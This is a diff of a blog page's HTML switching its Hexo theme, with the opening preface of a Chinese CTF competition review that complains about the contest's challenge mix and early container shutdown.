@@ -1,364 +1,276 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 8.1.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
-  <script src="/lib/pace/pace.min.js"></script>
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"cxyadvancer.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="前言这是第一次参加楚慧杯，主要是记录一下对本次赛题的复盘，以及知识点，还有就是小小吐槽一下。 这个题目分配极其不合理，那re还有pwn的题是不是有点少了，我土哥早早完在那打瓦了，misc有5道题写不完根本写不完，还有最后压轴题，都压轴了最后才放，俺是采集没那么厉害，时间真的有点紧张。，看群友吐槽的以为时大家最后都顿悟了，其实是高手屯的flag到最后冲榜的。本人阅历尚浅，第一次见flag是没有格式的">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>楚慧杯赛后总结 | Seove0n</title><meta name="author" content="Seove0n"><meta name="copyright" content="Seove0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="前言这是第一次参加楚慧杯，主要是记录一下对本次赛题的复盘，以及知识点，还有就是小小吐槽一下。 这个题目分配极其不合理，那re还有pwn的题是不是有点少了，我土哥早早完在那打瓦了，misc有5道题写不完根本写不完，还有最后压轴题，都压轴了最后才放，俺是采集没那么厉害，时间真的有点紧张。，看群友吐槽的以为时大家最后都顿悟了，其实是高手屯的flag到最后冲榜的。本人阅历尚浅，第一次见flag是没有格式的">
 <meta property="og:type" content="article">
 <meta property="og:title" content="楚慧杯赛后总结">
 <meta property="og:url" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/index.html">
-<meta property="og:site_name" content="程序元的blog">
+<meta property="og:site_name" content="Seove0n">
 <meta property="og:description" content="前言这是第一次参加楚慧杯，主要是记录一下对本次赛题的复盘，以及知识点，还有就是小小吐槽一下。 这个题目分配极其不合理，那re还有pwn的题是不是有点少了，我土哥早早完在那打瓦了，misc有5道题写不完根本写不完，还有最后压轴题，都压轴了最后才放，俺是采集没那么厉害，时间真的有点紧张。，看群友吐槽的以为时大家最后都顿悟了，其实是高手屯的flag到最后冲榜的。本人阅历尚浅，第一次见flag是没有格式的">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311211449447.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311211648399.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311211755627.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311212424612.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/denoised_result.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/denoised_result-%E4%B8%8A%E4%B8%8B%E5%8F%8D%E8%BD%AC.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310175319698.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310175511707.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310175648683.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/00024072.jpg">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180117543.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180233518.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180427020.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180619435.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180959171.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311215757413.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311220206773.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311215811234.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312105549417.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312110946206.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/PixPin_2026-03-10_16-04-37.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190142279.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190514474.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190623638.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190715722.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190808555.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312191626943.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312214257847.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313145130586.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313192702607.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313210019493.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313201041041.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313201102567.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312112209862.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312115513482.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310183315567.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310183448484.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310190436473.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310191047743.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310191750627.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310192133714.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/image/2.jpg">
 <meta property="article:published_time" content="2026-03-11T09:51:20.000Z">
 <meta property="article:modified_time" content="2026-03-23T13:01:22.701Z">
-<meta property="article:author" content="程序元">
+<meta property="article:author" content="Seove0n">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311211449447.png">
+<meta name="twitter:image" content="https://cxyadvancer.github.io/image/2.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "楚慧杯赛后总结",
+  "url": "https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/",
+  "image": "https://cxyadvancer.github.io/image/2.jpg",
+  "datePublished": "2026-03-11T09:51:20.000Z",
+  "dateModified": "2026-03-23T13:01:22.701Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Seove0n",
+      "url": "https://cxyadvancer.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/2.jpg"><link rel="canonical" href="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
 
-<link rel="canonical" href="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh-CN'
-  };
-</script>
-
-  <title>楚慧杯赛后总结 | 程序元的blog</title>
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
   
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
 
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
 
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">程序元的blog</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
+      const theme = saveToLocal.get('theme')
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://cxyadvancer.github.io/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="程序元">
-      <meta itemprop="description" content="路漫漫其修远兮，吾将上下而求索。">
-    </span>
-    
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="程序元的blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          楚慧杯赛后总结
-        </h1>
-    
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-    
-              <time title="创建时间：2026-03-11 17:51:20" itemprop="dateCreated datePublished" datetime="2026-03-11T17:51:20+08:00">2026-03-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-03-23 21:01:22" itemprop="dateModified" datetime="2026-03-23T21:01:22+08:00">2026-03-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">比赛复盘</span></a>
-                </span>
-            </span>
-    
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-             <span></span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>undefined 分钟</span>
-            </span>
-    
-        </div>
-      </header>
-    
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
     
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是第一次参加楚慧杯，主要是记录一下对本次赛题的复盘，以及知识点，还有就是小小吐槽一下。</p>
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '楚慧杯赛后总结',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div class="bg-animation" id="web_bg" style="background-image: url(/image/2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/2.jpg" onerror="this.onerror=null;this.src='/null'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Seove0n</span></a><a class="nav-page-title" href="/"><span class="site-name">楚慧杯赛后总结</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">楚慧杯赛后总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-11T09:51:20.000Z" title="发表于 2026-03-11 17:51:20">2026-03-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-23T13:01:22.701Z" title="更新于 2026-03-23 21:01:22">2026-03-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/">比赛复盘</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>36分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是第一次参加楚慧杯，主要是记录一下对本次赛题的复盘，以及知识点，还有就是小小吐槽一下。</p>
 <p>这个题目分配极其不合理，那re还有pwn的题是不是有点少了，我土哥早早完在那打瓦了，misc有5道题写不完根本写不完，还有最后压轴题，都压轴了最后才放，俺是采集没那么厉害，时间真的有点紧张。，看群友吐槽的以为时大家最后都顿悟了，其实是高手屯的flag到最后冲榜的。本人阅历尚浅，第一次见flag是没有格式的，这不是楚慧杯吗怎么还有DASCTF的事。还有最后为啥把容器关了，我不理解真复现写wp类，发现容器没了，那后面我还咋写啊。估计是大家在群里交流的太激烈了，也不让交流了。全部闭麦</p>
 <p>好了就吐槽这么多，其他的也不敢多说，题还是很好的记录一下</p>
